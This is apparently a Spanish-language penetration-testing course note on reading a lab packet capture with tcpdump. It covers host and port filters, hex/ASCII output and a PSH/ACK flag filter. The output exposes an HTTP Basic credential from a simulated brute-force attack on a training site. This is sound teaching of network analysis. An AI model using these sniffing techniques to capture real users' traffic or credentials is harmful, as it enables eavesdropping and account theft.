Como sabemos, *Tcpdump* es un sniffer de red basado en texto que es optimizado, potente y flexible a pesar de la falta de una interfaz gráfica. Es, con mucho, el analizador de paquetes de línea de comandos más utilizado y se puede encontrar en la mayoría de los sistemas operativos Unix y Linux, pero los permisos de los usuarios locales determinan la capacidad de capturar el tráfico de la red.

Tcpdump puede capturar tráfico de la red y leer archivos de captura existentes. Tanto en inteerfaces de red como en archivos .pcap:

```bash
kali@kali:~$ sudo tcpdump -r password_cracking_filtered.pcap
reading from file password_cracking_filtered.pcap, link-type EN10MB (Ethernet)
08:51:20.800917 IP 208.68.234.99.60509 > 172.16.40.10.81: Flags [S], seq 1855084074, win 14600, options [mss 1460,sackOK,TS val 25538253 ecr 0,nop,wscale 7], length 0
08:51:20.800953 IP 172.16.40.10.81 > 208.68.234.99.60509: Flags [S.], seq 4166855389, ack 1855084075, win 14480, options [mss 1460,sackOK,TS val 71430591 ecr 25538253,nop,wscale 4], length 0
08:51:20.801023 IP 208.68.234.99.60509 > 172.16.40.10.81: Flags [S], seq 1855084074, win 14600, options [mss 1460,sackOK,TS val 25538253 ecr 0,nop,wscale 7], length 0
08:51:20.801030 IP 172.16.40.10.81 > 208.68.234.99.60509: Flags [S.], seq 4166855389, ack 1855084075, win 14480, options [mss 1460,sackOK,TS val 71430591 ecr 25538253,nop,wscale 4], length 0
08:51:20.801048 IP 208.68.234.99.60509 > 172.16.40.10.81: Flags [S], seq 1855084074, win 14600, options [mss 1460,sackOK,TS val 25538253 ecr 0,nop,wscale 7], length 0
08:51:20.801051 IP 172.16.40.10.81 > 208.68.234.99.60509: Flags [S.], seq 4166855389, ack 1855084075, win 14480, options [mss 1460,sackOK,TS val 71430591 ecr 25538253,nop,wscale 4], length 0
...
```

La principal ventaja de TcpDump es que, al ser un cli nos permite tener una gran flexibilidad sobre los datos a través de comandos de filtración de datos o de editores de texto por línea de comandos:

```bash
kali@kali:~$ sudo tcpdump -n -r password_cracking_filtered.pcap | awk -F" " '{print $5}' | sort | uniq -c | head
  20164 172.16.40.10.81:
     14 208.68.234.99.32768:
     14 208.68.234.99.32769:
      6 208.68.234.99.32770:
     14 208.68.234.99.32771:
      6 208.68.234.99.32772:
      6 208.68.234.99.32773:
     15 208.68.234.99.32774:
     12 208.68.234.99.32775:
      6 208.68.234.99.32776:
...
```

Además, tcpdump cuenta de por sí sólo con muchos modificadores para filtrar los datos que enseña:

```bash
sudo tcpdump -n src host 172.16.40.10 -r password_cracking_filtered.pcap
...
08:51:20.801051 IP 172.16.40.10.81 > 208.68.234.99.60509: Flags [S.], seq 4166855389, ack 1855084075, win 14480, options [mss 1460,sackOK,TS val 71430591 ecr 25538253,nop,wscale 4], length 0
08:51:20.802053 IP 172.16.40.10.81 > 208.68.234.99.60509: Flags [.], ack 89, win 905, options [nop,nop,TS val 71430591 ecr 25538253], length 0
...
sudo tcpdump -n dst host 172.16.40.10 -r password_cracking_filtered.pcap
...
08:51:20.801048 IP 208.68.234.99.60509 > 172.16.40.10.81: Flags [S], seq 1855084074, win 14600, options [mss 1460,sackOK,TS val 25538253 ecr 0,nop,wscale 7], length 0
08:51:20.802026 IP 208.68.234.99.60509 > 172.16.40.10.81: Flags [.], ack 4166855390, win 115, options [nop,nop,TS val 25538253 ecr 71430591], length 0
...
sudo tcpdump -n port 81 -r password_cracking_filtered.pcap
...
08:51:20.800917 IP 208.68.234.99.60509 > 172.16.40.10.81: Flags [S], seq 1855084074, win 14600, options [mss 1460,sackOK,TS val 25538253 ecr 0,nop,wscale 7], length 0
08:51:20.800953 IP 172.16.40.10.81 > 208.68.234.99.60509: Flags [S.], seq 4166855389, ack 1855084075, win 14480, options [mss 1460,sackOK,TS val 71430591 ecr 25538253,nop,wscale 4], length 0
```

Observemos que en la parte arriba hemos seleccionado paquetes emitidos mientras que en la segunda, paquetes recibidos y en la tercera tráfico recibido sobre el puerto 81 tanto de entrada como de salida.

Además, podemos cambiar el formato de salida en HEX y ASCII con el modificaodr *-X*:

```bash
kali@kali:~$ sudo tcpdump -nX -r password_cracking_filtered.pcap
...
08:51:25.043062 IP 208.68.234.99.33313 > 172.16.40.10.81: Flags [P.], seq 1:140, ack 1
  0x0000:  4500 00bf 158c 4000 3906 9cea d044 ea63  E.....@.9....D.c
  0x0010:  ac10 280a 8221 0051 a726 a77c 6fd8 ee8a  ..(..!.Q.&.|o...
  0x0020:  8018 0073 1c76 0000 0101 080a 0185 b2f2  ...s.v..........
  0x0030:  0441 f5e3 4745 5420 2f2f 6164 6d69 6e20  .A..GET.//admin.
  0x0040:  4854 5450 2f31 2e31 0d0a 486f 7374 3a20  HTTP/1.1..Host:.
  0x0050:  6164 6d69 6e2e 6d65 6761 636f 7270 6f6e  admin.megacorpon
  0x0060:  652e 636f 6d3a 3831 0d0a 5573 6572 2d41  e.com:81..User-A
  0x0070:  6765 6e74 3a20 5465 6820 466f 7265 7374  gent:.Teh.Forest
  0x0080:  204c 6f62 7374 6572 0d0a 4175 7468 6f72  .Lobster..Author
  0x0090:  697a 6174 696f 6e3a 2042 6173 6963 2059  ization:.Basic.Y
  0x00a0:  5752 7461 5734 3662 6d46 7562 3352 6c59  WRtaW46bmFub3RlY
  0x00b0:  3268 7562 3278 765a 336b 780d 0a0d 0a    2hub2xvZ3kx....
...
```

<br />

#### 8.2. TcpDump Advanced Filtering.

Llegados a este punto querríamos hacer una búsqueda más avanzada sobre el contenido de los datos.

Concretamente, nos interesan todos aquellos paquetes TCP que contengan las TCP Flags ACK y PSH pues estos son los que están entre el final del 3-way  tcphandshake y el final FIN-ACK. Además la cabecera PSH se emplea para forzar la salida del paquete.  

En el siguiente diagrama podemos observar que las TCP flags están definidas sobre el 4º y 5º bit del 14º byte:

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20221231013139.png' | relative_url }}" text-align="center"/>
</div>

Entonces, sólo queremos aquellos paquetes cuyo 14 byte sea: 00011000 o en decimal 24:

```base
kali@kali:~$ echo "$((2#00011000))"
24
```

Esto lo podemos pasar a tcpdump como un modificador para sólo filtrar dichos paquetes con 'tcp\[13\]=24':

```bash
kali@kali:~$ sudo tcpdump -A -n 'tcp[13] = 24' -r password_cracking_filtered.pcap
06:51:20.802032 IP 208.68.234.99.60509 > 172.16.40.10.81: Flags [P.], seq 1855084075:1
E.....@.9....D.c..(
.].Qn.V+.]*....s1......
.....A..GET //admin HTTP/1.1
Host: admin.megacorpone.com:81
User-Agent: Teh Forest Lobster

...
E.....@.@.....(
.D.c.Q.^...E..?I...........
.A......HTTP/1.1 401 Authorization Required
Date: Mon, 22 Apr 2013 12:51:20 GMT
Server: Apache/2.2.20 (Ubuntu)
WWW-Authenticate: Basic realm="Password Protected Area"
Vary: Accept-Encoding
Content-Length: 488
Content-Type: text/html; charset=iso-8859-1

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>401 Authorization Required</title>
</head><body>
<h1>Authorization Required</h1>
<p>This server could not verify that you
are authorized to access the document
requested.  Either you supplied the wrong
credentials (e.g., bad password), or your
browser doesn't understand how to supply
the credentials required.</p>
<hr>
<address>Apache/2.2.20 (Ubuntu) Server at admin.megacorpone.com Port 81</address>
</body></html>

...

08:51:25.044432 IP 172.16.40.10.81 > 208.68.234.99.33313:
E..s.m@.@..U..(
.D.c.Q.!o....&......^u.....
.A......HTTP/1.1 301 Moved Permanently
Date: Mon, 22 Apr 2013 12:51:25 GMT
Server: Apache/2.2.20 (Ubuntu)
Location: http://admin.megacorpone.com:81/admin/
Vary: Accept-Encoding
Content-Length: 333
Content-Type: text/html; charset=iso-8859-1

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>301 Moved Permanently</title>
</head><body>
<h1>Moved Permanently</h1>
<p>The document has moved <a href="http://admin.megacorpone.com:81/admin/">here</a>.</p>
<hr>
<address>Apache/2.2.20 (Ubuntu) Server at admin.megacorpone.com Port 81</address>
</body></html>
```
